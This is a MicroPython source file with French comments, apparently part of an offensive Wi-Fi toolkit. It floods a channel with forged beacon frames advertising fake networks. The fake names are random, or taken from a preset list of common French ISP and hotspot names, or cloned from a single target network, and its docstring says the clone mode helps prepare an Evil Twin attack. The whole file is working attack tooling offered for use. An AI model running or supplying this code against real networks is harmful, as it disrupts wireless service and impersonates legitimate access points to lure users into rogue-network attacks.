import utime
import os
import network
from lib.packet_builder import build_beacon, send, random_mac
from lib.display import info, ok, warn, line
import config

_SSIDS_FR = [
    "FreeWifi", "FreeWifi_secure", "Freebox-ABCD", "Free 5G",
    "Livebox-1234", "Livebox Fibre", "Orange_XXXX", "Orange 5G",
    "SFR_BCDE", "SFR WiFi FON", "SFR-XXXX",
    "Bbox-ABCD", "BBox-XXXX",
    "DIRECT-Samsung", "DIRECT-Printer",
    "iPhone de Marc", "Android AP", "Redmi Note 12",
    "_nomap", "xfinitywifi", "NETGEAR_EXT",
]


def _rand_ssid(length=8):
    """SSID aléatoire de longueur variable."""
    pool = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
    return "".join(chr(pool[b % len(pool)]) for b in os.urandom(length))


def spam(ssids=None, count=0, interval_ms=5, channel=6, open_ap=True):
    """
    Flood de Beacon Frames sur le canal donné.

    ssids=None   → SSIDs entièrement aléatoires à chaque trame.
    ssids=[...]  → tourne en boucle sur la liste fournie.
    count=0      → infini jusqu'à Ctrl+C.
    open_ap      → True=réseau ouvert annoncé, False=WPA2 annoncé.
    """
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    wlan.config(channel=channel)

    use_random = ssids is None
    ssid_list  = ssids or []
    idx  = 0
    sent = 0

    info("Beacon spam — canal {} — {}{}".format(
        channel,
        "SSIDs aléatoires" if use_random else "{} SSIDs en boucle".format(len(ssid_list)),
        " — Open" if open_ap else " — WPA2 (annoncé)",
    ))

    try:
        while count == 0 or sent < count:
            if use_random:
                ssid  = _rand_ssid()
                bssid = random_mac()
            else:
                ssid  = ssid_list[idx % len(ssid_list)]
                bssid = random_mac()
                idx  += 1

            frame = build_beacon(ssid, bssid, channel=channel, open_ap=open_ap)
            if send(frame):
                sent += 1
                if config.DEBUG and sent % 100 == 0:
                    info("{} beacons envoyés".format(sent))

            utime.sleep_ms(interval_ms)

    except KeyboardInterrupt:
        warn("Spam stoppé")

    line()
    ok("{} beacon frames envoyées".format(sent))
    return sent


def spam_fr(channel=6):
    """Spam avec les SSIDs français prédéfinis (opérateurs courants)."""
    return spam(ssids=_SSIDS_FR, channel=channel, interval_ms=10)


def spam_random(channel=6, count=0):
    """Spam avec SSIDs entièrement aléatoires."""
    return spam(ssids=None, channel=channel, count=count, interval_ms=5)


def spam_clone(target_ssid, channel=6, count=0):
    """
    Spam en répétant un seul SSID (clone d'un réseau existant).
    Utile pour préparer un Evil Twin ou saturer un SSID précis.
    """
    info("Clone spam : \"{}\" sur canal {}".format(target_ssid, channel))
    return spam(ssids=[target_ssid], channel=channel, count=count, interval_ms=5)
